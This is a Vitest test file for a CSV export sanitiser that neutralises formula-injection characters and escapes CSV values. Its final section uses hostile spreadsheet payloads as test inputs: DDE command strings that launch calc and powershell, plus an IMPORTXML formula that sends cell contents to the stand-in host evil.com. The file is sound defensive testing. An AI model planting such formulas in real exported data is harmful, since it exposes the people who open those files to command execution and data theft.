import { describe, it, expect } from 'vitest';
import {
  sanitizeCell,
  sanitizeForCsv,
  sanitizeRow,
  escapeCsvValue,
  buildCsvLine,
  buildCsvContent,
  isLargeExport,
  LARGE_EXPORT_THRESHOLD,
} from './sanitizeForSpreadsheet';

describe('sanitizeCell', () => {
  it('should prefix cells starting with = to prevent formula execution', () => {
    expect(sanitizeCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
    expect(sanitizeCell('=cmd|...')).toBe("'=cmd|...");
    expect(sanitizeCell('=1+1')).toBe("'=1+1");
  });

  it('should prefix cells starting with + to prevent formula execution', () => {
    expect(sanitizeCell('+SUM(A1)')).toBe("'+SUM(A1)");
    expect(sanitizeCell('+33612345678')).toBe("'+33612345678");
  });

  it('should prefix cells starting with - to prevent formula execution', () => {
    expect(sanitizeCell('-ALERT()')).toBe("'-ALERT()");
    expect(sanitizeCell('-100')).toBe("'-100");
  });

  it('should prefix cells starting with @ to prevent formula execution', () => {
    expect(sanitizeCell('@import')).toBe("'@import");
    expect(sanitizeCell('@user')).toBe("'@user");
  });

  it('should not modify normal text', () => {
    expect(sanitizeCell('Hello World')).toBe('Hello World');
    expect(sanitizeCell('John Doe')).toBe('John Doe');
    expect(sanitizeCell('test@example.com')).toBe('test@example.com');
  });

  it('should handle empty strings', () => {
    expect(sanitizeCell('')).toBe('');
  });

  it('should handle whitespace-only strings', () => {
    expect(sanitizeCell('   ')).toBe('   ');
  });

  it('should sanitize after trimming (leading spaces with formula char)', () => {
    // The function trims before checking, so " =cmd" should be prefixed
    // because the trimmed version starts with =
    expect(sanitizeCell(' =cmd')).toBe("' =cmd");
  });
});

describe('sanitizeForCsv', () => {
  it('should sanitize strings', () => {
    expect(sanitizeForCsv('=formula')).toBe("'=formula");
    expect(sanitizeForCsv('normal')).toBe('normal');
  });

  it('should keep numbers as numeric strings without sanitization', () => {
    expect(sanitizeForCsv(123)).toBe('123');
    expect(sanitizeForCsv(-456)).toBe('-456');
    expect(sanitizeForCsv(0)).toBe('0');
    expect(sanitizeForCsv(3.14159)).toBe('3.14159');
  });

  it('should handle NaN', () => {
    expect(sanitizeForCsv(NaN)).toBe('');
  });

  it('should handle booleans', () => {
    expect(sanitizeForCsv(true)).toBe('true');
    expect(sanitizeForCsv(false)).toBe('false');
  });

  it('should handle null and undefined', () => {
    expect(sanitizeForCsv(null)).toBe('');
    expect(sanitizeForCsv(undefined)).toBe('');
  });

  it('should convert objects to string and sanitize', () => {
    expect(sanitizeForCsv({ key: 'value' })).toBe('[object Object]');
  });
});

describe('sanitizeRow', () => {
  it('should sanitize all values in a row', () => {
    const row = ['=formula', 'normal', 123, null, '+phone'];
    const result = sanitizeRow(row);
    expect(result).toEqual(["'=formula", 'normal', '123', '', "'+phone"]);
  });

  it('should handle empty rows', () => {
    expect(sanitizeRow([])).toEqual([]);
  });
});

describe('escapeCsvValue', () => {
  it('should escape values containing separator', () => {
    expect(escapeCsvValue('hello;world', ';')).toBe('"hello;world"');
  });

  it('should escape values containing quotes', () => {
    expect(escapeCsvValue('say "hello"', ';')).toBe('"say ""hello"""');
  });

  it('should escape values containing newlines', () => {
    expect(escapeCsvValue('line1\nline2', ';')).toBe('"line1\nline2"');
  });

  it('should sanitize AND escape dangerous values', () => {
    expect(escapeCsvValue('=cmd;attack', ';')).toBe("\"'=cmd;attack\"");
  });

  it('should not wrap simple values', () => {
    expect(escapeCsvValue('simple', ';')).toBe('simple');
  });
});

describe('buildCsvLine', () => {
  it('should build a CSV line from values', () => {
    const values = ['Name', 'Email', 100];
    expect(buildCsvLine(values, ';')).toBe('Name;Email;100');
  });

  it('should handle values needing escaping', () => {
    const values = ['John;Doe', '=formula', 50];
    const result = buildCsvLine(values, ';');
    expect(result).toBe('"John;Doe";"\'=formula";50');
  });

  it('should use default separator', () => {
    const values = ['a', 'b'];
    expect(buildCsvLine(values)).toBe('a;b');
  });
});

describe('buildCsvContent', () => {
  it('should build complete CSV with BOM by default', () => {
    const headers = ['Name', 'Value'];
    const rows = [['Test', 100], ['=Inject', 200]];
    const result = buildCsvContent(headers, rows);
    
    expect(result.startsWith('\uFEFF')).toBe(true);
    expect(result).toContain('Name;Value');
    expect(result).toContain('Test;100');
    expect(result).toContain("'=Inject;200");
  });

  it('should allow disabling BOM', () => {
    const headers = ['A'];
    const rows = [['B']];
    const result = buildCsvContent(headers, rows, { includeBom: false });
    
    expect(result.startsWith('\uFEFF')).toBe(false);
    expect(result).toBe('A\nB');
  });

  it('should allow custom separator', () => {
    const headers = ['A', 'B'];
    const rows = [['1', '2']];
    const result = buildCsvContent(headers, rows, { separator: ',', includeBom: false });
    
    expect(result).toBe('A,B\n1,2');
  });
});

describe('isLargeExport', () => {
  it('should return false for small exports', () => {
    expect(isLargeExport(100)).toBe(false);
    expect(isLargeExport(LARGE_EXPORT_THRESHOLD)).toBe(false);
  });

  it('should return true for large exports', () => {
    expect(isLargeExport(LARGE_EXPORT_THRESHOLD + 1)).toBe(true);
    expect(isLargeExport(50000)).toBe(true);
  });
});

describe('Real-world CSV injection scenarios', () => {
  it('should prevent DDE injection attacks', () => {
    // DDE (Dynamic Data Exchange) attack vectors
    expect(sanitizeCell('=cmd|"/C calc"!A0')).toBe("'=cmd|\"/C calc\"!A0");
    expect(sanitizeCell("=HYPERLINK(\"http://evil.com\",\"Click\")")).toBe("'=HYPERLINK(\"http://evil.com\",\"Click\")");
  });

  it('should prevent data exfiltration formulas', () => {
    expect(sanitizeCell('=IMPORTXML(CONCAT("http://evil.com/?",A1),"//")')).toMatch(/^'/);
    expect(sanitizeCell('+cmd|"/C powershell"!A0')).toMatch(/^'/);
  });

  it('should handle real user data safely', () => {
    // Legitimate data that happens to start with trigger chars
    expect(sanitizeCell('-$50.00')).toBe("'-$50.00");
    expect(sanitizeCell('+1-555-123-4567')).toBe("'+1-555-123-4567");
    expect(sanitizeCell('@mention in notes')).toBe("'@mention in notes");
  });

  it('should preserve email addresses', () => {
    // Email addresses don't start with trigger chars
    expect(sanitizeCell('user@example.com')).toBe('user@example.com');
  });
});
